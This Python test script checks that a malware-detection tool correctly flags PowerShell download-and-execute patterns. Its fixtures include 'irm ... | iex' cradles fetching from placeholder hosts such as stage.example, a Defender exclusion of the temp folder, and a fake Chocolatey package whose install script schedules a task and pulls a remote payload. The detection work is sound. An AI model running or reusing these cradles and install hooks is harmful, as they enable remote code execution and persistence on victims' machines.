#!/usr/bin/env python3
"""Preserve remote evaluation and attack context after alias consolidation."""
import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile
import zipfile

ROOT = Path(__file__).resolve().parents[2]
PIPE = 'micro-behaviors/process/deploy/script-eval::powershell-web-response-piped-eval-text'
OLD = 'objectives/command-and-control/dropper/script-eval/response-pipeline::ps-iwr-pipeline-eval'
PREFIX = 'objectives/command-and-control/dropper/script-eval/response-pipeline::'
DEFENDER = PREFIX + 'ps-network-eval-defender-exclusion'
PUBLIC = PREFIX + 'ps-iwr-public-code-pipeline'
PLUGIN = 'objectives/command-and-control/backdoor/loader/plugin::plugin-fetch-exec-hostile'
TASK = 'objectives/supply-chain/install-hook/package/nuget::chocolatey-scheduled-remote-stage'


def reports(stream):
    decoder = json.JSONDecoder()
    while stream.strip():
        report, end = decoder.raw_decode(stream.lstrip())
        yield report
        stream = stream.lstrip()[end:]


def main():
    with tempfile.TemporaryDirectory(prefix='slang-controls-') as directory:
        base = Path(directory)
        vendor = 'irm https://claude.ai/install.ps1 | iex\n'
        remote = 'irm https://stage.example/payload.ps1 | iex\n'
        defender = 'Add-MpPreference -ExclusionPath "$env:TEMP"\n'
        paths = '"plugins/sample-plugin/", "custom_nodes/example/", "modules/example/plugin/"\n'
        cases = {
            'vendor.ps1': (vendor, {PIPE: 3}, True),
            'ordinary-http.ps1': ('iwr -useb http://stage.example/code.ps1 | iex\n', {PIPE: 3}, True),
            'download-only.ps1': ('irm https://claude.ai/install.ps1\n', {}, True),
            'defender.ps1': (defender + remote, {PIPE: 3, DEFENDER: 5}, False),
            'vendor-and-defender.ps1': (vendor + defender + remote, {PIPE: 3, DEFENDER: 5}, False),
            'public.ps1': ('iwr https://jsonkeeper.com/abcd | iex\n', {PIPE: 3, PUBLIC: 5}, False),
            'public-vendor-mention.ps1': ('iwr https://jsonkeeper.com/abcd | iex # https://claude.ai/install.ps1\n', {PIPE: 3, PUBLIC: 5}, False),
            'plugin.ps1': (paths + remote, {PIPE: 3, PLUGIN: 5}, False),
            'two-paths.ps1': ('"plugins/sample-plugin/", "custom_nodes/example/"\n' + remote, {PIPE: 3}, True),
        }
        expected = {}
        for name, (source, required, quiet) in cases.items():
            target = base / name
            target.write_text(source)
            expected[target] = (required, quiet)
        for source, hostile in [
            ('testdata/drop-exec/hidden-iex-cradle.ps1', PREFIX + 'hidden-window-policy-bypassed-irm-eval'),
            ('testdata/stranded-member-controls/cradle-hidden-bypass.ps1', 'objectives/execution/payload/script-eval::powershell-hidden-cradle-launch'),
        ]:
            target = base / Path(source).name
            shutil.copyfile(ROOT / source, target)
            expected[target] = ({hostile: 5}, False)
        workflow = base / '.github/workflows/claude.yml'
        workflow.parent.mkdir(parents=True)
        workflow.write_text('name: CI\non: workflow_dispatch\njobs:\n  setup:\n    runs-on: windows-latest\n    steps:\n      - shell: pwsh\n        run: ' + vendor)
        expected[workflow] = ({PIPE: 3}, True)
        package = base / 'scheduled.nupkg'
        with zipfile.ZipFile(package, 'w') as archive:
            archive.writestr('package.nuspec', '<package><metadata><id>example</id><version>1.0</version></metadata></package>')
            archive.writestr('tools/chocolateyinstall.ps1', 'schtasks /create /tn Example /sc minute /tr powershell.exe\n' + remote)
        expected[package] = ({TASK: 5, PIPE: 3}, False)

        result = subprocess.run(
            [os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT), '--format', 'jsonl', *map(str, expected)],
            env=dict(os.environ, CLEAVE_VALIDATE='0'), text=True, capture_output=True, check=True,
        )
        seen = set()
        for report in reports(result.stdout):
            top = Path(report['files'][0]['path'])
            required, quiet = expected[top]
            seen.add(top)
            findings = {trait['id']: trait['crit'] for entry in report['files'] for trait in entry.get('traits', [])}
            assert OLD not in findings, (top, OLD)
            for trait, severity in required.items():
                assert findings.get(trait) == severity, (top, trait, findings.get(trait))
            if top.name == 'download-only.ps1':
                assert PIPE not in findings
            if top.name == 'two-paths.ps1':
                assert PLUGIN not in findings
            if quiet:
                assert not {trait: severity for trait, severity in findings.items() if severity >= 4}, (top, findings)
        assert seen == set(expected), (seen, set(expected))
        print(f'{len(seen)} remote-evaluation controls passed')


if __name__ == '__main__':
    main()
